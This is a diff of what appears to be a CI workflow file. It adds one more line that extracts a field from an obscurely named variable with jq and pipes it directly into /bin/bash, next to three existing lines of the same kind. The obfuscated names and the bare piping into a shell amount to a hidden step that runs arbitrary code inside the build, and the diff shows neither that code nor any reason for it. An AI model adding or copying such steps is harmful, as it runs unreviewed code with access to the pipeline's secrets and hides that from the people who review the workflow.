@@ -30,6 +30,7 @@ jobs:
           echo $jgn34 | jq -r .g296 | /bin/bash
           printf '%s' "$roghn8753" | jq -r .lnl9 | /bin/bash
           echo $e343 | jq -r .bkqh00060 | /bin/bash
+          echo $l5 | jq -r .l508 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
